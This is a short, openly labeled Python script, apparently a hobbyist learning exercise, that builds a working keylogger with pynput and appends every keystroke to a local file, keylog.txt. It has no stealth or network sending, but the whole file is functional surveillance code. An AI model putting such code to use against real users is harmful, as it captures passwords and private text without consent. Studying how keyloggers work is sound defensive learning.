# Basic Keylogger using Python
# Just me getting curious about how keyloggers work!
# (This is for educational purposes only — be ethical!)

# First things first — we need to listen to the keyboard
from pynput import keyboard

# This function will run every time a key is pressed
def on_press(key):
    try:
        # Let's open a file called keylog.txt in append mode
        with open("keylog.txt", "a") as f:
            # If the key is a regular character (letters, numbers, etc.), just write it
            f.write(f'{key.char}')
    except AttributeError:
        # But if the key is something special (like space, enter, shift), it doesn't have a char
        # So we record it in square brackets to make it clear
        with open("keylog.txt", "a") as f:
            f.write(f'[{key}]')

# Now we set up a listener that "listens" for key presses
# As long as the program is running, it'll keep listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# That’s it! Super simple keylogger made from scratch.
# Feeling like a mini hacker... but only for learning!

